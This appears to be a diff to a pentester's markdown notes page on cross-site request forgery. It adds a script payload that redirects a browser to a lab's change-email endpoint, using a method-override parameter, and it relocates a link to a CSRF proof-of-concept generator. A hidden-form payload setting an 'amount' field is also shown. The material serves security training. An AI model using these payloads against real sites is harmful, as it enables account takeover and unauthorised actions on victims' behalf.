@@ -16,11 +16,6 @@ seo:
   robots: "" # custom robot tags (optional)
   noindex: false # false (default) or true
 ---
-
-
-- Free Poc Tool : 
-https://security.love/CSRF-PoC-Genorator/
-
 ## Basic CSRF 
 
 ```sh
@@ -68,4 +63,14 @@ Even with if `get`is not allowed you can still override with _method
 <input type="hidden" name="amount" value="1000000">
 </form>
 ```
+
+- Or like this : 
+
+```sh
+<script> 
+document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"; </script>
+```
 `Other frameworks support a variety of similar parameters.`  
+
+- Free Poc Tool : 
+https://security.love/CSRF-PoC-Genorator/
